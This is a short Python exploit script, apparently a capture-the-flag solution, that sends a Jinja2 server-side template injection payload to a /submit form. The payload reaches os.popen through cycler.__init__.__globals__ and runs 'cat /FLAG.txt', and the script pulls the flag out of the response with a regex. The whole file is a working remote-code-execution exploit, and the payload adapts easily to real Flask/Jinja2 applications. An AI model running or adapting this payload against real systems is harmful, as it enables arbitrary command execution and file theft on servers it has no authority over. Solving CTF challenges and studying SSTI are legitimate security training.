import re
import requests
import sys

'''
@文件命名：X-080-24
@使用方式: python X-080-24.py url
@简述思路: Jinja2 SSTI 通过 __globals__ 执行系统命令 cat /FLAG.txt 后在回显中提取。
'''


def Scan(url):
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /FLAG.txt').read() }}"
    r = requests.post(url + "/submit", data={"name": payload}, timeout=5)
    return re.search(r"Thank you\s*(FLAG\{[^}]+\})\s*for your submission", r.text).group(1)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))

